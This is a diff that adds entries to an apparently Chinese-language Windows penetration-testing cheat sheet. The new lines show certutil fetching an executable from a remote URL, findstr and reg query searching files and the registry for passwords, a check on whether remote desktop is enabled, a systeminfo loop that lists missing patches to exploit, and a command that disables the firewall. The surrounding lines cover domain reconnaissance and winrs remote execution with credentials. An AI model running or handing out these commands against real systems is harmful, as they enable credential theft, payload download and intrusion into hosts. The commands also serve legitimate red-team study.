@@ -23,6 +23,44 @@ https://blog.csdn.net/qq_20307987/article/details/85087960
 
 ```bash
 
+
+certutil-----从远程url下载文件
+案例:certutil -urlcache  -split  -f http://baidu.com/test.exe
+
+findstr-----查找文件后缀结果
+findstr /s /i "pass" *.py*
+
+reg query HKLM /f password /t REG_SZ /s-----搜集注册表中的各种密码数据
+
+查看有没有开启远程链接，运行下面命令：
+REG QUERY "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections
+结果：1表示关闭，0表示开启
+
+快速查找未打补丁的exp
+systeminfo>bzhack.txt&(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type bzhack.txt|@find /i "%i"|| @echo %i you can exp)&del /f /q /a bzhack.txt
+
+
+
+md 	   建文件夹
+rd 	   删除文件夹
+tree 	显示文件夹结构
+dir 	显示磁盘目录内容
+copy 	复制文件
+Xcopy 	copy加强版，复制文件夹
+del 	删除文件
+ren 	[原文件/夹名][新文件/夹名]修改文件名
+type 	查看文本内容
+dir /a /s /b d:\"*.conf"		搜索d盘里conf结尾的文件
+edit 		文本编辑
+type 		显示文件内容
+
+hostname                 查看机器名  
+cls                      清屏
+net start                查看开启的服务，比如Terminal Services 远程连接服务
+net stop sharedaccess    关闭防火墙
+set                      查看当前机器的环境变量,看有没有我们可以直接利用到的语言环境
+fsutil fsinfo drives     列出当前机器上的所有盘符
+
 ifconfig /all 获取获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名
 net time /domain 查看域名、时间
 net view /domain 查看域内所有共享
@@ -108,6 +146,9 @@ winrs -r:https://myserver.com -t:600 -u:administrator -p:$%fgh7 ipconfig
 winrs -r:myserver -env:PATH=^%PATH^%;c:\tools -env:TEMP=d:\temp config.cmd
 winrs -r:myserver netdom join myserver /domain:testdomain /userd:johns /passwordd:$%fgh789
 winrs -r:myserver -ad -u:administrator -p:$%fgh7 dir \\anotherserver\share
+
+
+
 
 
 ```
